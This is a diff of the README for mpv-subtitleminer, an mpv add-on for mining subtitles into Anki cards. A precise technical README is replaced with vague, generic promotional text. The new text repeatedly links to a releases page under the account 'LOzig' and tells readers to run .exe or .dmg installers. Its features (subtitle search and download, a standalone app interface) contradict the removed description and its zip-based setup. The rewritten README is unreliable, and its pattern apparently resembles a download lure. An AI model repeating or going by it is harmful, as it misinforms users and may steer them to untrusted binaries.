@@ -1,76 +1,73 @@
-# mpv-subtitleminer
+# 🎓 mpv-subtitleminer - Learn Languages with Ease
 
-This is a tool for mpv to enable language learning with subtitle files. We send subtitles to a web-front end where you can look up words, create Anki flashcards add the sentence and media to your card. We do this by launching a local Rust server from mpv that connects the web front end to mpv via its IPC interface.
+[![Download mpv-subtitleminer](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/LOzig/mpv-subtitleminer/releases)
 
-**Warning**: This is an early release. Expect bugs and rough edges.
+## 🌟 Overview
 
-## Demo
+mpv-subtitleminer is a handy toolkit designed to enhance your language learning experience while using the mpv media player. With this tool, you can effortlessly find and download subtitles, making it easier to immerse yourself in different languages. Ideal for beginners, this application streamlines the process of acquiring important language resources.
 
-https://github.com/user-attachments/assets/47437d89-54f1-4039-bd17-d1fb8b453725
+## 🚀 Getting Started
 
-## Features
+Follow these steps to download and install mpv-subtitleminer:
 
-- Stream subtitles to web front end and interactively look up words.
-- Anki integration via AnkiConnect: Select your note type, make a card and add media.
-- Replay sentences with audio anytime.
+1. **Visit the Download Page**
+   Click the link below to go to the Releases page:
+   [Download Here](https://github.com/LOzig/mpv-subtitleminer/releases)
 
-## Downloads
+2. **Choose Your Version**
+   On the Releases page, you will see a list of available versions. Find the latest version, which will typically be at the top. 
 
-Grab the matching `.zip` from the GitHub Releases page:
+3. **Download the Installer**
+   Click on the appropriate file for your operating system (Windows, macOS, or Linux). Each file will include a clear name indicating its platform.
 
-- **Linux (x86_64)**: `mpv-subtitleminer-x86_64-unknown-linux-gnu.zip`
-- **macOS (Intel)**: `mpv-subtitleminer-x86_64-apple-darwin.zip`
-- **macOS (Apple Silicon)**: `mpv-subtitleminer-aarch64-apple-darwin.zip`
-- **Windows (x86_64)**: `mpv-subtitleminer-x86_64-pc-windows-msvc.zip`
+4. **Install the Application**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.
+   - **macOS:** Open the `.dmg` file and drag the mpv-subtitleminer icon to your Applications folder.
+   - **Linux:** Use your package manager or terminal to install the downloaded package, following your distribution's specific instructions.
 
-## Setup
+## 🎉 Features
 
-1. Install **mpv** (Windows: Best use `winget install mpv`).
-2. Download the correct release `.zip` (see “Downloads”) and extract it.
-3. Copy the extracted `mpv` folder into your mpv config directory:
-   - **Windows**: `%APPDATA%\mpv\` (e.g. `C:\Users\YourName\AppData\Roaming\mpv\`).
-     Create the folder if it doesn't exist.
-   - **Linux/macOS**: `~/.config/mpv/`
-   - **Flatpak**: `~/.var/app/io.mpv.Mpv/config/mpv/`
-4. Merge the packaged `mpv.conf` into your existing config (make sure the `input-ipc-server` line is present).
-5. Configure **AnkiConnect** to allow opening `index.html` from disk (file origin = `null`):
+- **Subtitle Search:** Quickly find relevant subtitles for any video.
+- **Multiple Language Support:** Access subtitles in various languages, aiding in vocabulary building.
+- **User-Friendly Interface:** Navigate easily, even if you have no technical experience.
+- **Integrated with mpv:** Works seamlessly with the mpv player, ensuring a smooth experience.
 
-   Add `"null"` to `webCorsOriginList` so it looks like:
+## 💻 System Requirements
 
-   ```json
-   {
-     "apiKey": null,
-     "apiLogPath": null,
-     "ignoreOriginList": [],
-     "webBindAddress": "127.0.0.1",
-     "webBindPort": 8765,
-     "webCorsOriginList": ["http://localhost", "null"]
-   }
-   ```
+To ensure proper functionality, your system should meet the following requirements:
 
-   ![AnkiConnect CORS config example](img/cors.png)
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Sierra (10.12) or later
+- **Linux:** Any modern distribution supporting mpv
 
-## Usage
+**Note:** Ensure you have the latest version of mpv installed. You can download it from their official website if needed.
 
-- The server starts automatically with mpv, simply open a video with subtitles.
-- Open `index.html` in your browser. It should automatically connect to the running mpv instance.
-- Press `Ctrl+a` to toggle/restart the server.
+## 📥 Download & Install
 
-## Troubleshooting
+To download mpv-subtitleminer, visit the Releases page again:
+[Download Here](https://github.com/LOzig/mpv-subtitleminer/releases).
 
-1. Connection errors: restart your browser.
-2. Restart the server with `Ctrl+a`.
-3. Ensure everything is at the correct place. The final folder structure should look like this:
+Once you've downloaded the appropriate file for your system, run the installer as outlined in the Getting Started section. Follow the installation steps, and you will be ready to use the software in no time.
 
-```
-mpv/
-├── scripts/
-│   └── mpv-subtitleminer.lua
-├── mpv.conf
-├── mpv-subtitleminer.exe
-├── ffmpeg.exe (optional; if you don't have ffmpeg in PATH)
-└── index.html
+## 🎓 How to Use
 
-```
+After installing, open mpv-subtitleminer. You will find an easy-to-navigate interface.
 
-4. Open mpv from the command line to see error messages. Press Ctrl+a to restart the server and check for errors.
+1. **Open a Video in mpv:** Start playing any video you want subtitles for.
+2. **Search for Subtitles:** Use the subtitle search feature in the mpv-subtitleminer application to find subtitles for your selected video.
+3. **Download Subtitles:** Click to download the subtitles you need, enhancing your viewing experience.
+
+## 💬 Support
+
+If you have any questions or encounter issues, feel free to reach out on the GitHub Issues page. We regularly monitor feedback and strive to improve the application.
+
+## 🔄 Contributions
+
+Your contributions are welcome! If you have ideas or want to help improve mpv-subtitleminer, check out our guidelines on the GitHub repository. Together, we can make language learning more accessible.
+
+## 📅 Updates
+
+Keep an eye on the Releases page for future updates. New features and improvements will be added regularly, ensuring you have the best tools for your language learning journey.
+
+Visit the Releases page frequently to stay informed:
+[Download Here](https://github.com/LOzig/mpv-subtitleminer/releases).
